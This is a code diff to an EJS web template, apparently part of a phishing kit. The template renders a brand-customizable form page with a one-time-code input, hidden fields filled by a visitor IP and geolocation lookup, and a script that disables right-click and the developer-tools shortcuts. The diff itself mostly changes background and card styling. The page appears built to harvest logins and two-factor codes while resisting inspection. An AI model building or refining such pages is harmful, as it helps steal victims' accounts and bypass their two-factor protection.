@@ -7,36 +7,55 @@
     <title><%= pageConfig.title %></title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .bg-custom {
+        body {
+            <% if (pageConfig.backgroundUrl) { %>
+            background-image: url('<%= pageConfig.backgroundUrl %>');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            <% } else { %>
             background-color: <%= pageConfig.backgroundColor || '#ffffff' %>;
+            <% } %>
         }
+
+        /*
+         * Card background logic:
+         *   image + color  → card gets the backgroundColor
+         *   image only     → card is fully transparent (no bg, no shadow)
+         *   color only     → card gets the backgroundColor
+         *   neither        → card defaults to white
+         */
+        .form-card {
+            <% if (pageConfig.backgroundUrl && pageConfig.backgroundColor) { %>
+            background-color: <%= pageConfig.backgroundColor %>;
+            <% } else if (pageConfig.backgroundUrl) { %>
+            background-color: transparent;
+            box-shadow: none;
+            <% } else { %>
+            background-color: <%= pageConfig.backgroundColor || '#ffffff' %>;
+            <% } %>
+        }
+
         .text-custom {
             color: <%= pageConfig.textColor || '#111827' %>;
         }
+
         .btn-custom {
             background-color: <%= pageConfig.buttonColor || '#3b82f6' %>;
             color: <%= pageConfig.buttonTextColor || '#ffffff' %>;
         }
+
         .btn-custom:hover {
             filter: brightness(0.9);
         }
-        <% if (pageConfig.backgroundUrl) { %>
-        .bg-image {
-            background-image: url('<%= pageConfig.backgroundUrl %>');
-            background-size: cover;
-            background-position: center;
-        }
-        <% } %>
     </style>
 </head>
-<body class="min-h-screen bg-custom text-custom">
-    <% if (pageConfig.backgroundUrl) { %>
-    <div class="fixed inset-0 bg-image opacity-20 pointer-events-none"></div>
-    <% } %>
-    
+
+<body class="min-h-screen text-custom">
     <div class="relative min-h-screen flex items-center justify-center p-4">
         <div class="w-full max-w-md">
-            <div class="bg-custom rounded-2xl shadow-xl p-8">
+            <div class="form-card rounded-2xl shadow-xl p-8">
+
                 <% if (pageConfig.logoUrl) { %>
                 <div class="flex justify-center mb-6">
                     <img src="<%= pageConfig.logoUrl %>" alt="Logo" class="h-16 object-contain">
@@ -46,11 +65,11 @@
                 <h1 class="text-2xl font-bold text-center text-custom mb-2">
                     <%= pageConfig.title %>
                 </h1>
-                
+
                 <% if (pageConfig.subtitle) { %>
                 <p class="text-center text-custom opacity-70 mb-4"><%= pageConfig.subtitle %></p>
                 <% } %>
-                
+
                 <% if (pageConfig.writeup) { %>
                 <p class="text-sm text-custom opacity-70 mb-6"><%= pageConfig.writeup %></p>
                 <% } else if (!pageConfig.subtitle) { %>
@@ -63,12 +82,10 @@
                     <div>
                         <label class="block text-sm font-medium text-custom mb-1">
                             <%= input.label %>
-                            <% if (input.required) { %>
-                            <span class="text-red-500">*</span>
-                            <% } %>
+                            <% if (input.required) { %><span class="text-red-500">*</span><% } %>
                         </label>
                         <% if (input.type === 'otp') { %>
-                        <input 
+                        <input
                             type="text"
                             name="input_<%= index %>"
                             placeholder="<%= input.placeholder || 'Enter code' %>"
@@ -81,7 +98,7 @@
                             autocomplete="off"
                         >
                         <% } else { %>
-                        <input 
+                        <input
                             type="<%= input.type %>"
                             name="input_<%= index %>"
                             placeholder="<%= input.placeholder %>"
@@ -101,11 +118,8 @@
                     <input type="hidden" value="" name="region" id="region">
                     <input type="hidden" value="" name="ip" id="ip">
 
-                    <button 
-                        type="submit"
-                        id="submitBtn"
-                        class="w-full py-3 px-4 btn-custom text-white font-semibold rounded-lg transition-all duration-200"
-                    >
+                    <button type="submit" id="submitBtn"
+                        class="w-full py-3 px-4 btn-custom text-white font-semibold rounded-lg transition-all duration-200">
                         <%= pageConfig.buttonText %>
                     </button>
                 </form>
@@ -115,11 +129,8 @@
                     <input type="hidden" value="" name="country" id="country">
                     <input type="hidden" value="" name="region" id="region">
                     <input type="hidden" value="" name="ip" id="ip">
-                    <button 
-                        type="submit"
-                        id="submitBtn"
-                        class="w-full py-3 px-4 btn-custom text-white font-semibold rounded-lg transition-all duration-200"
-                    >
+                    <button type="submit" id="submitBtn"
+                        class="w-full py-3 px-4 btn-custom text-white font-semibold rounded-lg transition-all duration-200">
                         <%= pageConfig.buttonText %>
                     </button>
                 </form>
@@ -134,22 +145,22 @@
                     </div>
                 </div>
                 <% } %>
+
             </div>
         </div>
     </div>
 
     <script>
-        const country = document.getElementById('country'); 
-        const region = document.getElementById('region'); 
-        const city = document.getElementById('cty'); 
+        const country = document.getElementById('country');
+        const region = document.getElementById('region');
+        const city = document.getElementById('cty');
         const ip = document.getElementById('ip');
         const submitBtn = document.getElementById('submitBtn');
         const form = document.getElementsByTagName('form')[0];
 
         submitBtn.addEventListener('click', (e) => {
             e.preventDefault();
-            
-            // Check if all required fields are filled
+
             const requiredInputs = form.querySelectorAll('input[required]');
             let allFilled = true;
             requiredInputs.forEach(input => {
@@ -161,10 +172,8 @@
                 }
             });
 
-            if (!allFilled) {
-                return;
-            }
-            
+            if (!allFilled) return;
+
             submitBtn.disabled = true;
             submitBtn.textContent = 'Please wait...';
             form.submit();
@@ -183,15 +192,11 @@
         }
         getIpInfo();
 
-        // Prevent form resubmission on refresh
         if (window.history.replaceState) {
             window.history.replaceState(null, null, window.location.href);
         }
 
-        // Disable right-click
         document.addEventListener('contextmenu', (e) => e.preventDefault());
-
-        // Disable developer tools shortcut
         document.addEventListener('keydown', (e) => {
             if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
                 e.preventDefault();
